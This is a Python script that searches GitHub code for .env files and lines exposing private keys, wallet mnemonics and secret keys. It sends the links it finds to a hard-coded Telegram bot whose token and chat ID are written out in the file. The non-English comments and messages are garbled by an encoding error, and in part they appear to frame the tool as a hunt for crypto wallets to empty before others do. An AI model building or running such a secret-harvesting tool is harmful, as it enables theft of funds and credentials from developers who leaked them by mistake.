import requests
import os

# Ø²Ø§Ù†ÛŒØ§Ø±ÛŒÛŒÛ•Ú©Ø§Ù†ÛŒ ØªÛÙ„ÛÚ¯Ø±Ø§Ù…
TELEGRAM_TOKEN = "8363879675:AAGOXZfmpGBNUY9DUyUR5DpyaDPcUmYmd50"
CHAT_ID = "7955490868"

def send_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
    requests.post(url, data=payload)

def github_hunter():
    print("ğŸ›°ï¸ Hunter is starting...")
    # Ù†Ø§Ù…Û•ÛŒ Ø¯Û•Ø³ØªÙ¾ÛÚ©Ø±Ø¯Ù† Ø¨Û† Ø¯ÚµÙ†ÛŒØ§Ø¨ÙˆÙˆÙ† Ù„Û•ÙˆÛ•ÛŒ Ø¨Û†ØªÛ•Ú©Û• Ø¦ÛŒØ´ Ø¯Û•Ú©Ø§Øª
    send_telegram("ğŸš€ **Ú•ÙˆÙˆØ¨Û†ØªÛ• Ø´Û•ÛŒØªØ§Ù†ÛŒÛŒÛ•Ú©Û• Ú†Ø§Ù„Ø§Ú© Ø¨ÙˆÙˆ!**\nØ¦ÛØ³ØªØ§ Ø®Û•Ø±ÛŒÚ©ÛŒ Ù¾Ø´Ú©Ù†ÛŒÙ†ÛŒ Ú¯ÛŒØªÚ¾Û•Ø¨Û• Ø¨Û† Ø¯Û†Ø²ÛŒÙ†Û•ÙˆÛ•ÛŒ Ø¬Ø²Ø¯Ø§Ù†Û•Ú©Ø§Ù†...")

    # Ø¦Û•Ùˆ ÙˆØ´Ø§Ù†Û•ÛŒ Ø¨Û•Ø¯ÙˆØ§ÛŒØ§Ù†Ø¯Ø§ Ø¯Û•Ú¯Û•Ú•ÛÛŒÙ† (BTC, ETH, Keys)
    queries = [
        'path:.env "PRIVATE_KEY"',
        'path:.env "MNEMONIC"',
        '"export SECRET_KEY="'
    ]
    
    # Ø¨Û•Ú©Ø§Ø±Ù‡ÛÙ†Ø§Ù†ÛŒ ØªÛ†Ú©Ù†ÛŒ Ú¯ÛŒØªÚ¾Û•Ø¨ Ø¨Û† Ø³ÛØ±Ú†
    headers = {"Authorization": f"token {os.getenv('GH_TOKEN')}"}
    
    for query in queries:
        url = f"https://api.github.com/search/code?q={query}+sort:indexed"
        try:
            res = requests.get(url, headers=headers).json()
            if 'items' in res:
                for item in res['items'][:2]: # ØªÛ•Ù†Ù‡Ø§ Ú¯Ø±Ù†Ú¯ØªØ±ÛŒÙ†Û•Ú©Ø§Ù†
                    file_url = item['html_url']
                    msg = f"ğŸ¯ **Ú¯Û•Ù†Ø¬ÛŒÙ†Û• Ø¯Û†Ø²Ø±Ø§ÛŒÛ•ÙˆÛ•!**\n\nğŸ”— Ù„ÛŒÙ†Ú©: {file_url}\n\nâš ï¸ Ø²ÙˆÙˆ Ø¨Ú•Û† Ø³Û•ÛŒØ±ÛŒ Ù†Ø§Ùˆ Ú©Û†Ø¯Û•Ú©Û• Ø¨Ú©Û• Ù¾ÛØ´ Ø¦Û•ÙˆÛ•ÛŒ Ú©Û•Ø³ÛÚ©ÛŒ ØªØ± Ø¨ÛŒØ¨Ø§Øª!"
                    send_telegram(msg)
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    github_hunter()
